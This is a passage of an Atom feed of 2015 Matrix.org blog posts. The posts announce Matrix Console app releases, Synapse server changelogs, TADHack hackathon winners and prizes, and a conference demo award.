&lt;p&gt;Get it now from the &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=org.matrix.androidsdk.alpha&quot;&gt;Google play store&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Enjoy! And please do let us know your feedback in &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Congrats to our TADHack Matrix Winner!</title>
        <published>2015-10-06T00:00:00+00:00</published>
        <updated>2015-10-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/10/06/congrats-to-our-tadhack-matrix-winner/" type="text/html"/>
        <id>https://matrix.org/blog/2015/10/06/congrats-to-our-tadhack-matrix-winner/</id>
        
        <content type="html">&lt;p&gt;A weekend of intense prototyping and hacking at &lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2015&#x2F;tadhack-mini-chicago&#x2F;&quot;&gt;TADHack-mini Chicago&lt;&#x2F;a&gt; is over, and we were very happy to again see some really interesting projects using Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;Team &#x27;Vivo&#x27; - Nestor Bermudez and Arin Sime - used Matrix, Tropo, and Telestax to create an Apple Watch app that notifies your loved ones when you are having a heart attack. Find &lt;a href=&quot;https:&#x2F;&#x2F;webrtc.ventures&#x2F;2015&#x2F;10&#x2F;apple-watch-heart-rate-monitor&#x2F;&quot;&gt;more information here&lt;&#x2F;a&gt; - and &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=dYrbKSgAZZI&quot;&gt;a recording of their presentation here&lt;&#x2F;a&gt;. This project won the Telestax prize.&lt;&#x2F;p&gt;
&lt;p&gt;Charles Solar and Jiang Shuyang used Matrix and Flowroute resources for a platform independent app called &#x27;Samaritan&#x27; which allows users to post help requests like &amp;quot;I got a flat tire!&amp;quot; or &amp;quot;My computer crashed!&amp;quot;. Others can then call &#x2F; text &#x2F; video chat with them to solve their problem. &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=jTcbFaAPArY&quot;&gt;A video of their presentation can be seen here&lt;&#x2F;a&gt;. This hack won the Flowroute prize.&lt;&#x2F;p&gt;
&lt;p&gt;Vladimir Beloborodov demoed his award-winning Matrix-hack from &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2014&#x2F;12&#x2F;24&#x2F;matrix-wins-best-innovation-award-at-webrtc-paris&#x2F;&quot;&gt;WebRTC Paris&lt;&#x2F;a&gt;: using Matrix just to set up a WebRTC connection between his iPad and robot, thus proving that you can have a robot with telepresence functions without having to depend on a remote server - see &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=Jq2vzavYiBI&quot;&gt;his demo here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Adnan Baleh, Caterina Lazaro, Javier Garcia, Ernesto G. Grabwosky, Sergio Gil and Marion Le Callonnec - Team &#x27;ProbatioNerds&#x27; - created a mobile Matrix app to control the provided &lt;a href=&quot;http:&#x2F;&#x2F;www.trossenrobotics.com&#x2F;HR-OS1&quot;&gt;Trossen Robotics HR-OS1 Humanoid Endoskeleton robot&lt;&#x2F;a&gt; over the Internet - even making it dance the Macarena! &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=lCv8dfbwr88&quot;&gt;Presentation video can be seen here&lt;&#x2F;a&gt;. We awarded team &#x27;ProbatioNerds&#x27; the TADHack Matrix prize - an HR-OS1 - and we hope the team and the robot will keep learning new tricks and moves!&lt;&#x2F;p&gt;
&lt;p&gt;[caption id=&amp;quot;attachment_1307&amp;quot; align=&amp;quot;aligncenter&amp;quot; width=&amp;quot;1024&amp;quot;]&lt;a href=&quot;http:&#x2F;&#x2F;blog.tadhack.com&#x2F;2015&#x2F;10&#x2F;04&#x2F;tadhack-mini-chicago-winners&#x2F;&quot;&gt;&lt;img src=&quot;&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;10&#x2F;2015-10-04-16.30.09-1024x683.jpg&quot; alt=&quot;Daniel presenting the HR-OS1 to team &#x27;ProbatioNerds&#x27;&quot; width=&quot;1024&quot; height=&quot;683&quot; class=&quot;size-full wp-image-1307&quot; &#x2F;&gt;&lt;&#x2F;a&gt; Daniel presenting the HR-OS1 to team &#x27;ProbatioNerds&#x27; &lt;em&gt;(Photo courtesy of Alan Quayle)&lt;&#x2F;em&gt;[&#x2F;caption]&lt;&#x2F;p&gt;
&lt;p&gt;We keep being impressed by the quality of projects developed at TADHacks - remember, in practice you only have around 12 hours to work on your hack. Congrats to all who participated - and thanks to &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;Alan_Quayle&quot;&gt;Alan&lt;&#x2F;a&gt; for arranging it!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix Console iOS 0.5.3</title>
        <published>2015-09-21T00:00:00+00:00</published>
        <updated>2015-09-21T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/09/21/matrix-console-ios-0-5-3/" type="text/html"/>
        <id>https://matrix.org/blog/2015/09/21/matrix-console-ios-0-5-3/</id>
        
        <content type="html">&lt;p&gt;Heads up that we&#x27;ve just pushed the big red release button on Matrix Console iOS 0.5.3. This includes a bunch of updates to MatrixKit that you can take advantage of in your MatrixKit powered app. These include:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Animated Gif support! &lt;img class=&quot;alignnone size-full wp-image-1275&quot; src=&quot;&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;09&#x2F;banana.gif&quot; alt=&quot;banana&quot; width=&quot;33&quot; height=&quot;35&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
	&lt;li&gt;Support for pasting images, videos and documents into the input field&lt;&#x2F;li&gt;
	&lt;li&gt;Inclusions of matrix IDs when searching&lt;&#x2F;li&gt;
	&lt;li&gt;Options to customise the thumbnail thumbnail display box&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
You can see the full MatrixKit change list in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-kit&#x2F;blob&#x2F;v0.2.3&#x2F;CHANGES.rst&quot;&gt;CHANGES.rst&lt;&#x2F;a&gt;.
&lt;p&gt;Happy GIFing!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>VoIP calling now supported in Android Matrix Console!</title>
        <published>2015-09-10T00:00:00+00:00</published>
        <updated>2015-09-10T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/09/10/voip-calling-now-supported-in-android-matrix-console/" type="text/html"/>
        <id>https://matrix.org/blog/2015/09/10/voip-calling-now-supported-in-android-matrix-console/</id>
        
        <content type="html">&lt;p&gt;The Android Matrix Console app has been updated to v0.4.4, and now supports voice and video calling! Get it now from the &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=org.matrix.androidsdk.alpha&quot;&gt;Google play store&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;In addition to the new voice and video support, and all the related call management, this release includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;One-tap &quot;autocomplete&quot;: clicking on a displayname inserts that into the message box&lt;&#x2F;li&gt;
	&lt;li&gt;Click on any (textual) event to copy its content&lt;&#x2F;li&gt;
	&lt;li&gt;The app can now be installed either in device memory or on the SD card&lt;&#x2F;li&gt;
	&lt;li&gt;Notifications can be enabled per room&lt;&#x2F;li&gt;
	&lt;li&gt;Fix for an edge-case where messages could be duplicated&lt;&#x2F;li&gt;
	&lt;li&gt;Fixed several reported issues&#x2F;crashes - for the full list look at the CHANGES files in the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-console&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;console&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;SDK&lt;&#x2F;a&gt; projects&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Enjoy! And please do let us know your feedback in &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Android Matrix Console 0.4.2 &amp; 0.4.3</title>
        <published>2015-07-07T00:00:00+00:00</published>
        <updated>2015-07-07T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/07/07/android-matrix-console-0-4-2/" type="text/html"/>
        <id>https://matrix.org/blog/2015/07/07/android-matrix-console-0-4-2/</id>
        
        <content type="html">&lt;p&gt;In the spirit of releasing early and often, we have pushed Android Matrix Console 0.4.2 to the &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=org.matrix.androidsdk.alpha&quot;&gt;Google Play store&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This release comes with a few new features as well as many bugfixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;A notification settings page has been added&lt;&#x2F;li&gt;
	&lt;li&gt;Added an image slider (access by tapping an image)&lt;&#x2F;li&gt;
	&lt;li&gt;Improved the management of multiple accounts&lt;&#x2F;li&gt;
	&lt;li&gt;Retaining filenames on upload&lt;&#x2F;li&gt;
	&lt;li&gt;Fixed the causes of two crashes that were reported via Google Analytics&lt;&#x2F;li&gt;
	&lt;li&gt;Several bugfixes - see &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-console&#x2F;blob&#x2F;master&#x2F;CHANGES.rst#changes-in-console-042-2015-07-06&quot;&gt;full changelog here&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Update: &lt;&#x2F;strong&gt; &lt;&#x2F;p&gt;
&lt;p&gt;We have pushed another update, version 0.4.3, after a bug was reported that affected some users upgrading to 0.4.2:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Fixed a bug where updating to 0.4.2 caused the history list to be empty&lt;&#x2F;li&gt;
	&lt;li&gt;Added presence information on avatars in rooms&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Android Matrix Console 0.4.1</title>
        <published>2015-06-30T00:00:00+00:00</published>
        <updated>2015-06-30T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/06/30/android-matrix-console-0-4-1/" type="text/html"/>
        <id>https://matrix.org/blog/2015/06/30/android-matrix-console-0-4-1/</id>
        
        <content type="html">&lt;p&gt;Super-quick post just to announce that we have released a new version of the Android Matrix Console. This version fixes a problem where the Playstore wouldn&#x27;t let some Android devices install the app just because they don&#x27;t have a SIM card, due to a required permission that wasn&#x27;t really needed anyway.&lt;&#x2F;p&gt;
&lt;p&gt;Grab the latest version from &lt;a href=&quot;http:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=org.matrix.androidsdk.alpha&quot;&gt;the play store&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.9.2 released</title>
        <published>2015-06-12T00:00:00+00:00</published>
        <updated>2015-06-12T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/06/12/synapse-0-9-2-released/" type="text/html"/>
        <id>https://matrix.org/blog/2015/06/12/synapse-0-9-2-released/</id>
        
        <content type="html">&lt;p&gt;Happy Friday everyone!&lt;&#x2F;p&gt;
&lt;p&gt;Over the past two weeks, we have been hunting down some more performance issues in Synapse, as well as fixing a few potential bugs in the new backfill feature that we introduced in 0.9.1. For those that were having issues, this release should really help speed up when your server joins larger remote rooms.&lt;&#x2F;p&gt;
&lt;p&gt;We have also been busy hacking on end-to-end encryption, which is very exciting. Hopefully we will have more details to share about that soon!&lt;&#x2F;p&gt;
&lt;p&gt;Get v0.9.2 now from &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;code&gt;
Changes in synapse v0.9.2 (2015-06-12)
======================================
&lt;p&gt;General:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Use ultrajson for json (de)serialisation when a canonical encoding is not required. Ultrajson is significantly faster than simplejson in certain circumstances.&lt;&#x2F;li&gt;
&lt;li&gt;Use connection pools for outgoing HTTP connections.&lt;&#x2F;li&gt;
&lt;li&gt;Process thumbnails on separate threads.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Configuration:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Add option, &lt;code&gt;gzip_responses&lt;&#x2F;code&gt;, to disable HTTP response compression.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Federation:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Improve resilience of backfill by ensuring we fetch any missing auth events.&lt;&#x2F;li&gt;
&lt;li&gt;Improve performance of backfill and joining remote rooms by removing unnecessary computations. This included handling events we had previously handled as well as attempting to compute the current state for outliers.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;code&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Global TADHack hackathon</title>
        <published>2015-06-05T00:00:00+00:00</published>
        <updated>2015-06-05T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/06/05/global-tadhack-hackathon/" type="text/html"/>
        <id>https://matrix.org/blog/2015/06/05/global-tadhack-hackathon/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2015&#x2F;&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;06&#x2F;TADHack2015-global-banner-460x860.png&quot; alt=&quot;TADHack2015-global-banner-460x860&quot; width=&quot;870&quot; height=&quot;460&quot; class=&quot;aligncenter size-full wp-image-1080&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Next weekend, June 13 and 14, the global &lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2015&#x2F;&quot;&gt;TADHack&lt;&#x2F;a&gt; takes place all over the world. You can participate &lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2015&#x2F;tadhack-global&#x2F;&quot;&gt;on site&lt;&#x2F;a&gt; or remotely, and there are a lot of different prizes to be won - in total the prize pot is worth $35k!&lt;&#x2F;p&gt;
&lt;p&gt;For the best two hacks using our technology, we will award a whole lot of Tessel modules! Tessel is a new breed of development board that runs entirely on &lt;a href=&quot;https:&#x2F;&#x2F;nodejs.org&#x2F;&quot;&gt;Node.js&lt;&#x2F;a&gt;, and they come with different modules you can plug in - for more information, see: &lt;a href=&quot;http:&#x2F;&#x2F;start.tessel.io&#x2F;install&quot;&gt;getting started&lt;&#x2F;a&gt; &amp;amp; &lt;a href=&quot;https:&#x2F;&#x2F;tessel.hackster.io&#x2F;&quot;&gt;sample projects&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Both prizes will include several tessel modules, including:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;start.tessel.io&#x2F;&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;06&#x2F;tessel.jpg&quot; alt=&quot;tessel&quot; width=&quot;354&quot; height=&quot;300&quot; class=&quot;alignright size-full wp-image-1079&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;multiple core tessel boards&lt;&#x2F;li&gt;
	&lt;li&gt;multiple servo modules and many servo motors&lt;&#x2F;li&gt;
	&lt;li&gt;multiple ambient modules&lt;&#x2F;li&gt;
	&lt;li&gt;multiple accelerometer modules&lt;&#x2F;li&gt;
	&lt;li&gt;camera module&lt;&#x2F;li&gt;
	&lt;li&gt;GPS module with antenna&lt;&#x2F;li&gt;
	&lt;li&gt;microsd module&lt;&#x2F;li&gt;
	&lt;li&gt;bluetooth module&lt;&#x2F;li&gt;
	&lt;li&gt;audio module&lt;&#x2F;li&gt;
	&lt;li&gt;climate module&lt;&#x2F;li&gt;
	&lt;li&gt;relay module&lt;&#x2F;li&gt;
	&lt;li&gt;RFID module&lt;&#x2F;li&gt;
	&lt;li&gt;DIY module kit&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Matrix.org will be present at the &lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2015&#x2F;tadhack-global&#x2F;#london&quot;&gt;London site&lt;&#x2F;a&gt;, Idea London in Shoreditch, where we will help both local and remote participants (via &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;) using the Matrix APIs as part of their hacks. &lt;&#x2F;p&gt;
&lt;p&gt;So if you have some spare time next weekend - why not have a think about what could be a cool hack and join us for the global TADHack event! See you there!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix wins &quot;Most Entertaining Demo&quot; at Kamailio World!</title>
        <published>2015-06-01T00:00:00+00:00</published>
        <updated>2015-06-01T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/06/01/matrix-wins-most-entertaining-demo-at-kamailio-world/" type="text/html"/>
        <id>https://matrix.org/blog/2015/06/01/matrix-wins-most-entertaining-demo-at-kamailio-world/</id>
        
        <content type="html">&lt;p&gt;We are back from &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2015&#x2F;05&#x2F;26&#x2F;next-up-kamailio-world&#x2F;&quot;&gt;Kamailio World&lt;&#x2F;a&gt;, where we presented and participated in James Body&#x27;s &amp;quot;Dangerous Demos&amp;quot;. We were racing against the deadline, but managed to join the demos at the very last minute - and even win the award for &amp;quot;Most Entertaining Demo&amp;quot;!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;06&#x2F;mostentertainingdemo1.jpg&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;06&#x2F;mostentertainingdemo1.jpg&quot; alt=&quot;mostentertainingdemo&quot; width=&quot;600&quot; height=&quot;450&quot; class=&quot;aligncenter size-full wp-image-1055&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It was great to catch up with old acquaintances - and meet many new ones! There were only around 150 people at Kamailio World, but given the area of expertise is very specialised, you can pretty much start talking to anyone and have a really interesting conversation.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;06&#x2F;2015-05-29-Matrix-KamailioWorld.pptx&quot;&gt;Here are the slides&lt;&#x2F;a&gt; of Matthew&#x27;s presentation, (&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;06&#x2F;2015-05-29-Matrix-KamailioWorld.pdf&quot;&gt;also available as .pdf&lt;&#x2F;a&gt;) and a video of the presentation:&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;E0uMm04MIuk&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;A video from the dangerous demo event is available here:&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;D7jZSYkXqt4?start=2630&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;The Parrot Drone we use in the demo has a 14 megapixel fisheye camera with advanced stabilization techniques which means that you can&#x27;t actually see what happened when everybody went &amp;quot;ooh&amp;quot; - I assure you the &amp;quot;flip&amp;quot; command does exactly what you would expect!&lt;&#x2F;p&gt;
&lt;p&gt;Thanks to everybody who talked to us at Kamailio - and as always, come find us in the &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; room on Matrix! &lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Announcing Synapse 0.9.0 and Matrix Angular SDK 0.6.6!</title>
        <published>2015-05-11T00:00:00+00:00</published>
        <updated>2015-05-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/05/11/announcing-synapse-0-9-0-and-matrix-angular-sdk-0-6-6/" type="text/html"/>
        <id>https://matrix.org/blog/2015/05/11/announcing-synapse-0-9-0-and-matrix-angular-sdk-0-6-6/</id>
        
        <content type="html">&lt;p&gt;We have pushed out a new release of both &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot; title=&quot;Synapse&quot;&gt;Synapse&lt;&#x2F;a&gt;, our reference server implementation, and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-angular-sdk&quot; title=&quot;matrix-angular-sdk&quot;&gt;matrix-angular-sdk&lt;&#x2F;a&gt;, our reference webclient implementation!&lt;&#x2F;p&gt;
&lt;p&gt;The major new feature in Synapse is that you can now run Synapse backed by a PostgreSQL database. This increases performance and allows Synapse to scale much better! This, as well as various performance related bug fixes, should make things much snappier than before. Of course, you can still run SQLite; it&#x27;s up to you what you want to use.&lt;&#x2F;p&gt;
&lt;p&gt;In the webclient you can now change or reset your password - we have had this feature requested a few times (although honestly I&#x27;m surprised it hasn&#x27;t been mentioned even more - maybe people are just better than me at remembering&#x2F;managing their passwords) so this should be a welcome addition! We also fixed a memory leak in Angular, so again expect better performance!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we have done some work on improving the Application Service API, making it more reliable and secure. Please see the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;UPGRADE.rst&quot; title=&quot;upgrade notes&quot;&gt;upgrade notes&lt;&#x2F;a&gt; as well as the full changelog below.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Changes in Synapse v0.9.0:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;General:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Add support for using a PostgreSQL database instead of SQLite. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;postgres.rst&quot; title=&quot;postgres.rst&quot;&gt;postgres.rst&lt;&#x2F;a&gt; for details.&lt;&#x2F;li&gt;
	&lt;li&gt;Add password change and reset APIs. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;master&#x2F;specification&#x2F;10_client_server_api.rst#registration&quot; title=&quot;Registration&quot;&gt;Registration&lt;&#x2F;a&gt; in the spec.&lt;&#x2F;li&gt;
	&lt;li&gt;Fix memory leak due to not releasing stale notifiers - &lt;a href=&quot;&#x2F;jira&#x2F;browse&#x2F;SYN-339&quot; title=&quot;SYN-339&quot;&gt;SYN-339&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
	&lt;li&gt;Fix race in caches that occasionally caused some presence updates to be dropped - &lt;a href=&quot;&#x2F;jira&#x2F;browse&#x2F;SYN-369&quot; title=&quot;SYN-369&quot;&gt;SYN-369&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
	&lt;li&gt;Check server name has not changed on restart.&lt;&#x2F;li&gt;
	&lt;li&gt;Add a sample systemd unit file and a logger configuration in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tree&#x2F;master&#x2F;contrib&#x2F;systemd&quot; title=&quot;contrib&#x2F;systemd&quot;&gt;contrib&#x2F;systemd&lt;&#x2F;a&gt;. Contributed Ivan Shapovalov.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Federation:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Add key distribution mechanisms for fetching public keys of unavailable remote home servers. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;6f2698&#x2F;specification&#x2F;30_server_server_api.rst#retrieving-server-keys&quot; title=&quot;Retrieving Server Keys&quot;&gt;Retrieving Server Keys&lt;&#x2F;a&gt; in the spec.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Configuration:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Add support for multiple config files.&lt;&#x2F;li&gt;
	&lt;li&gt;Add support for dictionaries in config files.&lt;&#x2F;li&gt;
	&lt;li&gt;Remove support for specifying config options on the command line, except for:
            &lt;ul&gt;&lt;li&gt;--daemonize - Daemonize the home server.&lt;&#x2F;li&gt;
	        &lt;li&gt;--manhole - Turn on the twisted telnet manhole service on the given port.&lt;&#x2F;li&gt;
   	        &lt;li&gt;--database-path - The path to a sqlite database to use.&lt;&#x2F;li&gt;
	        &lt;li&gt;--verbose - The verbosity level.&lt;&#x2F;li&gt;
 	        &lt;li&gt;--log-file - File to log to.&lt;&#x2F;li&gt;
	        &lt;li&gt;--log-config - Python logging config file.&lt;&#x2F;li&gt;
	        &lt;li&gt;--enable-registration - Enable registration for new users.&lt;&#x2F;li&gt;&lt;&#x2F;ul&gt;
	&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Application services:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Reliably retry sending of events from Synapse to application services, as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;0c6bd9&#x2F;specification&#x2F;25_application_service_api.rst#home-server---application-service-api&quot; title=&quot;Application Services&quot;&gt;Application Services&lt;&#x2F;a&gt; spec.&lt;&#x2F;li&gt;
	&lt;li&gt;Application services can no longer register via the &#x2F;register API, instead their configuration should be saved to a file and listed in the synapse app_service_config_files config option. The AS configuration file has the same format as the old &#x2F;register request. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;application_services.rst&quot; title=&quot;application_services.rst&quot;&gt;application_services.rst&lt;&#x2F;a&gt; for more information.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Changes in Matrix Angular SDK 0.6.6:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Add password change and reset feature using v2_alpha APIs.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Bug fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Fix memory leak caused by not removing a watcher on the root scope.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix at WebRTC Conference &amp; Expo, Miami</title>
        <published>2015-05-11T00:00:00+00:00</published>
        <updated>2015-05-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/05/11/matrix-at-webrtc-conference-expo-miami/" type="text/html"/>
        <id>https://matrix.org/blog/2015/05/11/matrix-at-webrtc-conference-expo-miami/</id>
        
